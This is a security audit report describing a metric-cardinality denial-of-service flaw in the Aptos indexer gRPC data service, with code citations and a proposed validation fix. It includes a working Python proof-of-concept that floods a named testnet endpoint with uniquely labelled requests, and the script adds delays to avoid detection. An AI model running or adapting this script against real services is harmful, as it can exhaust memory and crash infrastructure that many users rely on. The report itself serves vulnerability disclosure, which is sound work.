# Audit Report

## Title
Unbounded Metric Cardinality Explosion via User-Controlled Processor Names in Indexer GRPC Data Service

## Summary
The indexer-grpc-data-service allows authenticated clients to specify arbitrary processor names via the `x-aptos-request-name` HTTP header, which are directly used as Prometheus metric labels without validation or cardinality limits. An attacker can create thousands of unique processor names, causing unbounded metric series growth that exhausts Prometheus memory and crashes the data service.

## Finding Description
The `PROCESSED_VERSIONS_COUNT_PER_PROCESSOR` metric and several related metrics use five labels including a `processor` label derived from user input. [1](#0-0) 

The processor name is extracted directly from the `x-aptos-request-name` HTTP header via the `get_request_metadata()` function without any validation, length limits, or cardinality constraints: [2](#0-1) 

When these metrics are incremented, they use the unvalidated processor name as a label: [3](#0-2) 

The label values are constructed from the request metadata: [4](#0-3) 

**Attack Path:**
1. Attacker authenticates through the API Gateway (requires valid credentials)
2. For each request to `GetTransactions`, attacker sends a unique value in the `x-aptos-request-name` header
3. Each unique processor name creates new time series across multiple metrics: `PROCESSED_VERSIONS_COUNT_PER_PROCESSOR`, `LATEST_PROCESSED_VERSION_PER_PROCESSOR`, `CONNECTION_COUNT`, `SHORT_CONNECTION_COUNT`, `BYTES_READY_TO_TRANSFER_FROM_SERVER`, and `NUM_TRANSACTIONS_STRIPPED`
4. Prometheus stores all time series in memory indefinitely
5. After thousands of unique processor names, memory is exhausted
6. Data service becomes unresponsive or crashes with OOM errors

The vulnerability affects multiple metrics beyond just `PROCESSED_VERSIONS_COUNT_PER_PROCESSOR`: [5](#0-4) 

No authentication interceptor or rate limiting exists to prevent this abuse, despite comments suggesting otherwise: [6](#0-5) 

## Impact Explanation
This is a **High severity** vulnerability per the Aptos bug bounty criteria because it causes:

1. **API crashes**: Memory exhaustion leads to data service crashes, preventing all indexer clients from accessing blockchain data
2. **Validator node slowdowns**: If validators rely on the indexer service for monitoring or operations, the crash impacts their performance
3. **Significant protocol violations**: Breaks the Resource Limits invariant that operations must respect memory constraints

While not directly affecting consensus or causing loss of funds, the indexer-grpc-data-service is critical infrastructure that many ecosystem applications depend on. A sustained attack could cause widespread ecosystem disruption.

## Likelihood Explanation
**Likelihood: High**

The attack requires only:
- Valid API credentials (available to any legitimate user)
- Ability to send HTTP headers with requests (trivial)
- Knowledge of the `x-aptos-request-name` header (documented in the codebase)

No special privileges, validator access, or complex technical exploitation is needed. An attacker with a single API key can create thousands of unique metric series in minutes by scripting requests with incrementing processor names (e.g., `processor_0`, `processor_1`, ..., `processor_9999`).

The lack of any validation, rate limiting, or cardinality constraints makes this trivially exploitable.

## Recommendation
Implement cardinality protection through one or more of the following measures:

1. **Validate and sanitize processor names**: Implement a whitelist of allowed processor names or pattern validation
2. **Limit unique processor names per user**: Track unique processor names per `identifier` and reject requests exceeding a threshold
3. **Use cardinality-limited metrics**: Aggregate metrics at a higher level or use constant labels
4. **Implement rate limiting**: Limit the number of new metric series that can be created per time period

**Recommended fix in `constants.rs`:**

```rust
// Add validation constants
const MAX_PROCESSOR_NAME_LENGTH: usize = 64;
const ALLOWED_PROCESSOR_NAME_PATTERN: &str = r"^[a-zA-Z0-9_-]+$";

pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    // ... existing code ...
    
    let mut processor_name = req.metadata()
        .get(GRPC_REQUEST_NAME_HEADER)
        .map(|value| value.to_str().unwrap_or("unspecified").to_string())
        .unwrap_or("unspecified".to_string());
    
    // Validate processor name
    if processor_name.len() > MAX_PROCESSOR_NAME_LENGTH {
        processor_name = "invalid_length".to_string();
    }
    
    let pattern = regex::Regex::new(ALLOWED_PROCESSOR_NAME_PATTERN).unwrap();
    if !pattern.is_match(&processor_name) {
        processor_name = "invalid_format".to_string();
    }
    
    request_metadata_map.insert("processor_name".to_string(), processor_name);
    // ... rest of code ...
}
```

Alternatively, remove the `processor` label from metrics entirely and rely on the `identifier` (application ID) for tracking, which is already controlled by the API Gateway.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Cardinality Explosion in Aptos Indexer GRPC Data Service
Demonstrates creating unbounded metric series via unique processor names
"""

import grpc
import time
from aptos_protos.indexer.v1 import raw_data_pb2, raw_data_pb2_grpc

# Configuration
GRPC_ENDPOINT = "grpc.testnet.aptoslabs.com:443"
AUTH_TOKEN = "your_valid_api_token"
APPLICATION_ID = "your_app_id"

def create_channel():
    credentials = grpc.ssl_channel_credentials()
    channel = grpc.secure_channel(GRPC_ENDPOINT, credentials)
    return channel

def exploit_cardinality(num_unique_processors=10000):
    """
    Creates num_unique_processors unique metric series by sending
    requests with different processor names
    """
    channel = create_channel()
    stub = raw_data_pb2_grpc.RawDataStub(channel)
    
    print(f"Starting cardinality explosion with {num_unique_processors} unique processors")
    
    for i in range(num_unique_processors):
        # Create unique processor name for each request
        processor_name = f"malicious_processor_{i}"
        
        # Craft request with unique processor name in metadata
        metadata = [
            ('x-aptos-data-authorization', AUTH_TOKEN),
            ('x-aptos-request-name', processor_name),  # Unique processor name
            ('x-aptos-identifier', APPLICATION_ID),
        ]
        
        request = raw_data_pb2.GetTransactionsRequest(
            starting_version=1000000,
            transactions_count=1  # Minimal transaction fetch
        )
        
        try:
            # This creates a new metric series for this unique processor name
            response = stub.GetTransactions(request, metadata=metadata)
            # Consume one response to trigger metric increment
            next(response)
            
            if i % 100 == 0:
                print(f"Created {i} unique metric series...")
                
        except Exception as e:
            print(f"Error at iteration {i}: {e}")
            
        # Small delay to avoid immediate detection
        time.sleep(0.1)
    
    print(f"Successfully created {num_unique_processors} unique metric series")
    print("Prometheus memory usage should be significantly increased")
    print("Query http://data-service:9101/metrics to see cardinality explosion")

if __name__ == "__main__":
    exploit_cardinality(10000)
```

**Expected Result**: After running this PoC, querying the Prometheus metrics endpoint will show thousands of unique time series for `indexer_grpc_data_service_with_user_processed_versions`, each with a different `processor` label value. Memory consumption will grow linearly with the number of unique processor names, eventually causing OOM crashes.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/metrics.rs (L14-27)
```rust
pub static LATEST_PROCESSED_VERSION_PER_PROCESSOR: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "indexer_grpc_data_service_with_user_latest_processed_version",
        "Latest processed transaction version",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/metrics.rs (L30-43)
```rust
pub static PROCESSED_VERSIONS_COUNT_PER_PROCESSOR: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "indexer_grpc_data_service_with_user_processed_versions",
        "Number of transactions that have been processed by data service",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L60-68)
```rust
    pub fn get_label_values(&self) -> Vec<&str> {
        vec![
            &self.request_identifier_type,
            &self.request_identifier,
            &self.request_email,
            &self.request_application_name,
            &self.processor_name,
        ]
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L72-106)
```rust
pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    let request_metadata_pairs = vec![
        (
            "request_identifier_type",
            REQUEST_HEADER_APTOS_IDENTIFIER_TYPE,
        ),
        ("request_identifier", REQUEST_HEADER_APTOS_IDENTIFIER),
        ("request_email", REQUEST_HEADER_APTOS_EMAIL),
        (
            "request_application_name",
            REQUEST_HEADER_APTOS_APPLICATION_NAME,
        ),
        ("request_token", GRPC_AUTH_TOKEN_HEADER),
        ("processor_name", GRPC_REQUEST_NAME_HEADER),
    ];
    let mut request_metadata_map: HashMap<String, String> = request_metadata_pairs
        .into_iter()
        .map(|(key, value)| {
            (
                key.to_string(),
                req.metadata()
                    .get(value)
                    .map(|value| value.to_str().unwrap_or("unspecified").to_string())
                    .unwrap_or("unspecified".to_string()),
            )
        })
        .collect();
    request_metadata_map.insert(
        "request_connection_id".to_string(),
        Uuid::new_v4().to_string(),
    );

    // TODO: update the request name if these are internal requests.
    serde_json::from_str(&serde_json::to_string(&request_metadata_map).unwrap()).unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L551-553)
```rust
                PROCESSED_VERSIONS_COUNT_PER_PROCESSOR
                    .with_label_values(&request_metadata.get_label_values())
                    .inc_by(current_batch_size as u64);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L179-191)
```rust
        // Add authentication interceptor.
        let server = RawDataServerWrapper::new(
            self.redis_read_replica_address.clone(),
            self.file_store_config.clone(),
            self.data_service_response_channel_size,
            self.txns_to_strip_filter.clone(),
            cache_storage_format,
            Arc::new(in_memory_cache),
        )?;
        let svc = aptos_protos::indexer::v1::raw_data_server::RawDataServer::new(server)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Gzip);
```
